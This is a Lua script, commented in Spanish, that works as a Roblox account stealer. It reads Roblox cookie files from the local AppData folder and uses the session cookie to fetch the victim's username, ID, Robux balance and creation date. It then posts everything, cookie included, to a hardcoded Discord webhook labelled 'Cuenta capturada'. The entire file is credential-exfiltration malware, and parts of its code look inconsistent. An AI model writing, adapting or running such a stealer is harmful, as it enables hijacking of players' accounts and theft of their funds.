local WEBHOOK = "https://discord.com/api/webhooks/1574916444737503366/oVzDIU9pqdV20Azuik5b6nMWsL6A9yO7Id4f_wb_45jLZT9FEbISvvDhCUH1dKHjyKNR"

-- Lee las cookies de Roblox (Windows)
local function readRobloxCookies()
    local paths = {
        os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\robloxcookies.dat",
        os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\rbx-cookies.dat",
        os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\cookies.dat",
    }
    for _, path in ipairs(paths) do
        local file = io.open(path, "rb")
        if file then
            local data = file:read("*a")
            file:close()
            if data then
                local cookie = data:match("(%d+)")
                if cookie then return cookie end
            end
        end
    end
    return nil
end

-- Envía los datos al webhook
local function sendWebhook(user, uid, robux, created, cookie)
    local payload = {
        username = "Roblox Logger",
        embeds = {
            {
                title = "Cuenta capturada",
                color = 65280,
                fields = {
                    { name = "Usuario", value = user, inline = true },
                    { name = "ID", value = uid, inline = true },
                    { name = "Robux", value = robux, inline = true },
                    { name = "Creada", value = created, inline = false },
                    { name = "Cookie", value = cookie, inline = false },
                },
                footer = { text = "Venice.ai" },
            },
        },
    }
    http.request({
        Url = WEBHOOK,
        Body = game:GetService("HttpService"):JSONEncode(payload),
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
    })
end

-- Ejecuta
local cookie = readRobloxCookies()
if cookie then
    local success, response = pcall(function()
        local info = http.request({
            Url = "https://users.roblox.com/v1/users/authenticated",
            Headers = { ["Cookie"] = ".ROBLOSECURITY=" .. cookie },
        }).Body
        local user = info:match('"name":"([^"]+)"') or "Desconocido"
        local uid = info:match('"id":(%d+)') or "N/A"
        local robux = "N/A"
        local created = "N/A"
        if uid then
            local r = http.request({
                Url = "https://economy.roblox.com/v1/users/" .. uid .. "/currency",
                Headers = { ["Cookie"] = ".ROBLOSECURITY=" .. cookie },
            }).Body
            robux = r:match('"robux":(%d+)') or "N/A"
            local d = http.request({
                Url = "https://users.roblox.com/v1/users/" .. uid,
                Headers = { ["Cookie"] = ".ROBLOSECURITY=" .. cookie },
            }).Body
            created = d:match('"created":"([^"]+)"') or "N/A"
        end
        sendWebhook(user, uid, robux, created, cookie)
    end)
    if not success then
        print("Error:", response)
    end
end
